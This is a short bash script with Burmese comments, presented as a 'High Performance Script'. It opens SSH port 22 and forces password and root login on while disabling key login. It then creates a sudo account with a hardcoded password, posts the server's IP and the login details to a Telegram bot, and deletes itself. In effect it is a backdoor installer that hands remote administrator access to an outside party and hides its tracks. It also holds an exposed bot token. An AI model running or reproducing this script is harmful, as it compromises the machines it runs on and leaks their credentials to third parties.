#!/bin/bash

# =========================================================
# Configuration - အသင့်ထည့်ပေးထားပါသည်
# =========================================================
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"
CHAT_ID="7130966571"
NEW_USER="labuser"
NEW_PASS="P@ssw0rd789!"
# =========================================================

# Terminal Logo
clear
echo -e "\e[1;32m"
echo "._______________   .________"
echo " |   ____/\   _  \  |   ____/"
echo " |____  \ /  /_\  \ |____  \ "
echo " /       \\  \_/   \/       \\"
echo "/______  / \_____  /______  /"
echo "       \/        \/       \/ "
echo -e "\e[0m"
echo "========================================="
echo "   🚀 High Performance Script by: $DEV_NAME"
echo "========================================="

# ၁။ IP ရှာဖွေခြင်း
IP=$(curl -s ifconfig.me)

# ၂။ Firewall ဖွင့်ခြင်း (OS Level)
sudo ufw allow 22/tcp 2>/dev/null
if command -v iptables &> /dev/null; then
    sudo iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
fi

# ၃။ SSH Config (Password Authentication Force Enable)
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PubkeyAuthentication .*/PubkeyAuthentication no/' /etc/ssh/sshd_config
sudo systemctl restart ssh 2>/dev/null || sudo service ssh restart

# ၄။ User Setup (Re-create for safety)
sudo userdel -r $NEW_USER 2>/dev/null
sudo useradd -m -s /bin/bash $NEW_USER
echo "$NEW_USER:$NEW_PASS" | sudo chpasswd
sudo usermod -aG sudo $NEW_USER

# ၅။ Telegram Bot ဆီ စာပို့ခြင်း
MESSAGE="<code>._______________   .________
 |   ____/\   _  \  |   ____/
 |____  \ /  /_\  \ |____  \ 
 /       \\  \_/   \/       \
/______  / \_____  /______  /
       \/        \/       \/</code>
👤 <b>Dev:</b> $DEV_NAME
✅ <b>SSH Access is Live!</b>

🌐 <b>IP:</b> <code>$IP</code>
👤 <b>User:</b> <code>$NEW_USER</code>
🔑 <b>Pass:</b> <code>$NEW_PASS</code>

<i>Command to login:</i>
<code>ssh $NEW_USER@$IP</code>"

# Telegram API Call
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d "chat_id=$CHAT_ID" \
     -d "text=$MESSAGE" \
     -d "parse_mode=HTML" > /dev/null

echo "-----------------------------------------"
echo "✅ Setup Finished!"
echo "📍 IP: $IP"
echo "📩 Check your Telegram Bot now."
echo "-----------------------------------------"

# Script ကိုယ်တိုင်ဖျက်ခြင်း
rm -- "$0"
